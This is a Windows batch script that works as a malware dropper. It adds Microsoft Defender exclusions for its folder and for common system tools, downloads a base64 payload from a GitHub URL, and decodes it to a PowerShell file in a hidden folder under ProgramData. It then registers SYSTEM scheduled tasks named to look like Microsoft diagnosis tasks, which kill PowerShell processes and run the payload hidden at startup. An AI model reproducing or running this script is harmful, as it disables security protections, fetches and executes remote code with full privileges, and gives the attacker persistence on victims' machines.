@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260729M ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "PAYURL=https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateM.b64"
set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "MARKER=WU_BUILD_20260729M"
set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
set "KILLTASK=\Microsoft\Windows\Diagnosis\WMICleanup"

echo Using payload URL:
echo %PAYURL%

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue}Catch{}"

attrib -h -s -r "%WORKDIR%\*" /s >nul 2>&1
del /f /q "%WORKDIR%\*.ps1" >nul 2>&1
del /f /q "%WORKDIR%\*.b64" >nul 2>&1

curl.exe -L -H "Cache-Control: no-cache" -H "Pragma: no-cache" -o "%B64%" "%PAYURL%"
if not exist "%B64%" (
  echo Download failed.
  exit /b 1
)

for %%A in ("%B64%") do (
  echo Downloaded bytes: %%~zA
  if %%~zA LSS 1000 (
    echo Download too small.
    exit /b 1
  )
)

certutil.exe -decode "%B64%" "%PS1%"
if errorlevel 1 (
  echo certutil decode failed, trying PowerShell decode...
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllText('%B64%') -replace '\s',''; [IO.File]::WriteAllBytes('%PS1%',[Convert]::FromBase64String($b))"
)

if not exist "%PS1%" (
  echo Decode failed - no output file.
  exit /b 2
)

for %%A in ("%PS1%") do echo Decoded bytes: %%~zA

findstr /C:"%MARKER%" "%PS1%" >nul
if errorlevel 1 (
  echo ERROR: decoded payload missing %MARKER%
  findstr /C:"WU_BUILD" "%PS1%"
  exit /b 3
)

attrib +h +s "%WORKDIR%" >nul 2>&1
attrib +h +s "%PS1%" >nul 2>&1

REM 1) SYSTEM killer: Guest cannot taskkill SYSTEM powershell holding the mutex
schtasks /Delete /TN "%KILLTASK%" /F >nul 2>&1
schtasks /Create /TN "%KILLTASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c taskkill /F /IM powershell.exe & ping -n 3 127.0.0.1 >nul"
schtasks /Run /TN "%KILLTASK%"
ping -n 5 127.0.0.1 >nul

REM 2) SYSTEM payload launch (survives SC 10s kill)
schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS1%\""
if errorlevel 1 (
  echo ERROR: could not create SYSTEM task
  exit /b 4
)
schtasks /Run /TN "%ONCETASK%"
if errorlevel 1 (
  echo ERROR: could not run SYSTEM task
  exit /b 4
)

echo Payload OK [%MARKER%], killed old PS as SYSTEM then launched.
echo Wait 90s then: type "%WORKDIR%\.diag.log"
echo Must see WU_BUILD_20260729M (not J/K).
exit /b 0

